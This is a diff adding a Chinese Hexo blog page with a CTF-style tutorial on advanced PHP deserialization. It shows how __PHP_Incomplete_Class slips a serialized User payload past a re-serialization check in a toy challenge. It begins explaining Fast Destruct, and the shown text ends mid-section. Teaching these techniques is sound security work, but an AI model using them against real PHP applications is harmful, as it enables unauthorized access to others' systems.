@@ -1,0 +1,1137 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    
+    <meta name="author" content="The Redefine Team">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes ASAP (before DOMContentLoaded)
+            (function() {
+                const addBodyClass = () => {
+                    const b = document.body;
+                    if (!b) return false;
+                    b.classList.add(theme + "-mode");
+                    return true;
+                };
+
+                // Try immediately
+                if (addBodyClass()) return;
+
+                // Observe until body exists
+                const mo = new MutationObserver(() => {
+                    if (addBodyClass()) mo.disconnect();
+                });
+                mo.observe(document.documentElement, { childList: true, subtree: true });
+            })();
+        })();
+    </script>
+    
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://kivvs.github.io/2026/08/14/反序列化进阶/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+        
+        <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="反序列化进阶">
+<meta property="og:url" content="https://kivvs.github.io/2026/08/14/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9B%E9%98%B6/index.html">
+<meta property="og:site_name" content="kivvs">
+<meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://kivvs.github.io/images/redefine-og.webp">
+<meta property="article:published_time" content="2026-08-14T09:55:00.000Z">
+<meta property="article:modified_time" content="2026-08-14T09:55:54.888Z">
+<meta property="article:author" content="kivvs">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://kivvs.github.io/images/redefine-og.webp">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/redefine-favicon.svg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/redefine-favicon.svg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/redefine-favicon.svg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            反序列化进阶 | Theme Redefine
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"kivvs.github.io","root":"/","language":"zh-CN"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Theme Redefine","subtitle":{"text":[],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":[{"icon":"fa-brands fa-github","url":null},{"icon":"fa-brands fa-twitter","url":null},{"icon":"fa-solid fa-at","url":"you@example.com"},{"icon":"fa-brands fa-telegram","url":null},{"icon":"/images/custom-icon.svg","url":null}],"qrs":[{"icon":"fa-brands fa-weixin","qr":null},{"icon":"/images/custom-icon.svg","qr":null}]}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1","theme":{"light":"default","dark":"dark"}}},"version":"2.9.0","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur","masonry":{"batch_size":12,"initial_batch_size":24}},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footer":{"runtime":true,"icon":"<i class=\"fa-solid fa-heart fa-beat\" style=\"--fa-animation-duration: 0.5s; color: #f54545\"></i>","start":"2022/8/17 11:45:14","statistics":true,"customize":null,"icp":{"enable":false,"number":null,"url":null}},"footerStart":"2022/8/17 11:45:14","mermaid":{"style":{"light":"default","dark":"dark"}}};
+    window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+    window.i18n = {"search":"站内搜索您需要的内容...","toc":"目录","prev":"上一页","next":"下一页","prev_posts":"上一篇","next_posts":"下一篇","page":"第 %d 页","recent_posts":"最新文章","share":"分享","powered_by":"由 %s 驱动","theme":"主题","rss_feed":"RSS Feed","category":"分类","categories":"分类","tag":"标签","tags":"标签","post":"文章","posts":"文章","tagcloud":"标签云","comment":"评论","comments":"评论","top":"置顶","sticky":"置顶","go-back-home":"回到首页","masonry_loading":"照片加载中...","image_viewer":"图片查看器","close":"关闭","exif":{"title":"EXIF","cards":{"camera":"相机","lens":"镜头","exposure":"曝光","other":"其他"},"fields":{"make":"品牌","model":"机型","date_taken":"拍摄时间","lens_model":"镜头","focal_length":"焦距","focus_mode":"对焦模式","shutter":"快门","aperture":"光圈","iso":"感光度","exposure_program":"曝光程序","exposure_compensation":"曝光补偿","metering_mode":"测光模式","flash":"闪光灯","white_balance":"白平衡","latitude":"纬度","longitude":"经度","altitude":"海拔"},"status":{"loading":"加载中...","no_exif":"无 EXIF 信息","library_missing":"EXIF 库未加载","image_source_missing":"图片地址不可用","unavailable":"EXIF 不可用（可能被 CORS 阻止或缺少元数据）","flag_unavailable":"EXIF 不可用"}},"home":"首页","archive":"归档","archives":"归档","about":"关于","links":"链接","link":"链接","friends":"友情链接","friend":"友情链接","timeline":"时间轴","shuoshuo":"说说","bookmarks":"书签","site_uv":"访问人数","site_pv":"总访问量","read_more":"阅读全文","wordcount":"字","min2read":"分钟","changelog":"更新日志","status":"状态","runtime":"博客已运行","days":"天","hours":"小时","minutes":"分钟","seconds":"秒","optimized_by":"并由 Evan 进行优化","rights":"版权所有","site_posts":"共撰写了 %s 篇文章","site_wordcount":"共 %s 字","copyright":{"title":"标题","author":"作者","link":"链接","create_time":"创建于","update_time":"更新于","license_title":"版权声明","license_content":"本文章采用 %s 进行许可。","all_rights_reserved":"版权所有 &#169 %s，禁止转载。","public_domain":"本文为公有领域作品，可自由转载、引用。"},"ago":{"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"},"create_time":"创建","update_time":"更新","expired":"这篇文章最后更新于 %s 天前，内容可能已经过时。"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+
+<body>
+	<div class="progress-bar-container">
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Theme Redefine
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    首页
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                首页
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">3</div>
+        <div class="label text-third-text-color text-sm">标签</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">2</div>
+        <div class="label text-third-text-color text-sm">分类</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">10</div>
+        <div class="label text-third-text-color text-sm">文章</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">反序列化进阶</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] shrink-0 rounded-medium border border-border-color p-px">
+				<img src="/images/redefine-avatar.svg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">The Redefine Team</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv2</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2026-08-14 17:55</span>
+        <span class="mobile">2026-08-14 17:55</span>
+        <span class="hover-info">创建</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2026-08-14 17:55:54</span>
+            <span class="mobile">2026-08-14 17:55:54</span>
+            <span class="hover-info">更新</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/web%E5%AD%A6%E4%B9%A0/">web学习</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/web/">web</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<h1 id="PHP-反序列化进阶：不完整类、Fast-Destruct-与-Callable"><a href="#PHP-反序列化进阶：不完整类、Fast-Destruct-与-Callable" class="headerlink" title="PHP 反序列化进阶：不完整类、Fast Destruct 与 Callable"></a>PHP 反序列化进阶：不完整类、Fast Destruct 与 Callable</h1><p>PHP 反序列化题的基础利用通常围绕魔术方法展开，例如 <code>__wakeup()</code>、<code>__destruct()</code>、<code>__toString()</code>。但在 CTF 题目中，单纯会构造对象 payload 往往不够，还需要理解一些进阶技巧。</p>
+<p>本文整理三个常见进阶点：</p>
+<ul>
+<li><code>__PHP_Incomplete_Class</code>：类不存在时如何绕过检查。</li>
+<li>Fast Destruct：如何让 <code>__destruct()</code> 提前触发。</li>
+<li>Callable：如何把可控属性当成函数或方法调用。</li>
+</ul>
+<p>这三个点经常单独出现，也可以组合进同一条利用链。</p>
+<h2 id="1-PHP-不完整类"><a href="#1-PHP-不完整类" class="headerlink" title="1. PHP 不完整类"></a>1. PHP 不完整类</h2><h3 id="1-1-PHP-Incomplete-Class"><a href="#1-1-PHP-Incomplete-Class" class="headerlink" title="1.1 __PHP_Incomplete_Class"></a>1.1 __PHP_Incomplete_Class</h3><p>PHP 在反序列化对象时，如果当前环境里找不到目标类，就不会还原出真实对象，而是生成一个特殊对象：</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__PHP_Incomplete_Class</span></span><br></pre></td></tr></table></figure></div>
+
+<p>例如 payload：</p>
+<div class="code-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;User&quot;:1:&#123;s:4:&quot;role&quot;;s:5:&quot;admin&quot;;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>如果当前代码中没有定义 <code>User</code> 类：</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$x</span> = <span class="string">&#x27;O:4:&quot;User&quot;:1:&#123;s:4:&quot;role&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$x</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$obj</span>);</span><br></pre></td></tr></table></figure></div>
+
+<p>结果类似：</p>
+<div class="code-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">object(__PHP_Incomplete_Class) &#123;</span><br><span class="line">  [&quot;__PHP_Incomplete_Class_Name&quot;] =&gt; &quot;User&quot;</span><br><span class="line">  [&quot;role&quot;] =&gt; &quot;admin&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>重点有三个：</p>
+<ul>
+<li>它不是 <code>User</code> 对象。</li>
+<li>它不会触发 <code>User</code> 的魔术方法。</li>
+<li>它仍然保存原类名和属性。</li>
+</ul>
+<p>所以，不完整类不是“反序列化失败”，而是 PHP 用一种特殊对象保留了原对象信息。</p>
+<h3 id="1-2-常见场景"><a href="#1-2-常见场景" class="headerlink" title="1.2 常见场景"></a>1.2 常见场景</h3><p>常见情况有两种。</p>
+<p>第一种：类没有定义或没有加载。</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:4:&quot;User&quot;:1:&#123;s:4:&quot;role&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure></div>
+
+<p>如果执行到这里时 <code>User</code> 类不存在，就会得到 <code>__PHP_Incomplete_Class</code>。</p>
+<p>第二种：使用了 <code>allowed_classes</code> 限制。</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$x</span>, [<span class="string">&#x27;allowed_classes&#x27;</span> =&gt; <span class="literal">false</span>]);</span><br></pre></td></tr></table></figure></div>
+
+<p>这会禁止对象还原成真实类，对象会变成不完整类。</p>
+<p>也可能是白名单不包含目标类：</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$x</span>, [<span class="string">&#x27;allowed_classes&#x27;</span> =&gt; [<span class="string">&#x27;SafeClass&#x27;</span>]]);</span><br></pre></td></tr></table></figure></div>
+
+<p>如果 payload 里是 <code>User</code>，但白名单只有 <code>SafeClass</code>，也会生成不完整类。</p>
+<h3 id="1-3-绕过原理"><a href="#1-3-绕过原理" class="headerlink" title="1.3 绕过原理"></a>1.3 绕过原理</h3><p>CTF 里常见这种检查：</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">serialize</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$x</span>)) != <span class="variable">$x</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;bad&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>这个检查想确认：用户传入的序列化字符串经过 PHP 解析后，再重新序列化，是否还能保持原样。</p>
+<p>它可以拦一些不规范 payload，例如尾部垃圾数据：</p>
+<div class="code-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;User&quot;:1:&#123;s:4:&quot;role&quot;;s:5:&quot;admin&quot;;&#125;aaaa</span><br></pre></td></tr></table></figure></div>
+
+<p><code>unserialize()</code> 可能只解析前面的合法部分，但 <code>serialize()</code> 不会保留尾部 <code>aaaa</code>，所以前后字符串不一致，检查失败。</p>
+<p>但是如果目标类在检查阶段不存在，情况就不同了。</p>
+<p>假设 payload 是：</p>
+<div class="code-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;User&quot;:1:&#123;s:4:&quot;role&quot;;s:5:&quot;admin&quot;;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>检查阶段执行：</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$x</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p>由于 <code>User</code> 类不存在，得到的是：</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__PHP_Incomplete_Class</span></span><br></pre></td></tr></table></figure></div>
+
+<p>但这个不完整类内部保留：</p>
+<div class="code-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__PHP_Incomplete_Class_Name = User</span><br><span class="line">role = admin</span><br></pre></td></tr></table></figure></div>
+
+<p>再执行：</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">serialize</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$x</span>))</span><br></pre></td></tr></table></figure></div>
+
+<p>PHP 很多情况下会重新输出原始对象格式：</p>
+<div class="code-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;User&quot;:1:&#123;s:4:&quot;role&quot;;s:5:&quot;admin&quot;;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>因此：</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">serialize</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$x</span>)) == <span class="variable">$x</span></span><br></pre></td></tr></table></figure></div>
+
+<p>可以成立。</p>
+<p>这就是不完整类绕过该检查的核心。</p>
+<h3 id="1-4-典型题目结构"><a href="#1-4-典型题目结构" class="headerlink" title="1.4 典型题目结构"></a>1.4 典型题目结构</h3><div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$x</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">serialize</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$x</span>)) != <span class="variable">$x</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;bad&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$role</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;role === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$x</span>);</span><br></pre></td></tr></table></figure></div>
+
+<p>执行链路：</p>
+<div class="code-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload 是 User 对象</span><br><span class="line">  -&gt; 检查阶段 User 类还没有定义</span><br><span class="line">  -&gt; unserialize($x) 得到 __PHP_Incomplete_Class</span><br><span class="line">  -&gt; serialize() 恢复原始 User payload</span><br><span class="line">  -&gt; 检查通过</span><br><span class="line">  -&gt; 后面定义 User 类</span><br><span class="line">  -&gt; 再次 unserialize($x)</span><br><span class="line">  -&gt; User 被真实实例化</span><br><span class="line">  -&gt; 请求结束触发 __destruct()</span><br></pre></td></tr></table></figure></div>
+
+<p>payload：</p>
+<div class="code-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;User&quot;:1:&#123;s:4:&quot;role&quot;;s:5:&quot;admin&quot;;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>这里真正重要的是类加载顺序：</p>
+<div class="code-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">检查阶段：目标类不存在</span><br><span class="line">利用阶段：目标类存在</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="2-Fast-Destruct"><a href="#2-Fast-Destruct" class="headerlink" title="2. Fast Destruct"></a>2. Fast Destruct</h2><h3 id="2-1-简介"><a href="#2-1-简介" class="headerlink" title="2.1 简介"></a>2.1 简介</h3><p>Fast Destruct 是 PHP 反序列化利用中的一个触发时机技巧。</p>
+<p>它的作用是：</p>
+<div class="code-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">让对象的 __destruct() 提前触发，而不是等到脚本结束时才触发。</span><br></pre></td></tr></table></figure></div>
+
+<p>正常情况下，对象的 <code>__destruct()</code> 通常在对象生命周期结束时执行。</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;destruct&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">Evil</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;hello&#x27;</span>;</span><br></pre></td></tr></table></figure></div>
+
+<p>输出顺序一般是：</p>
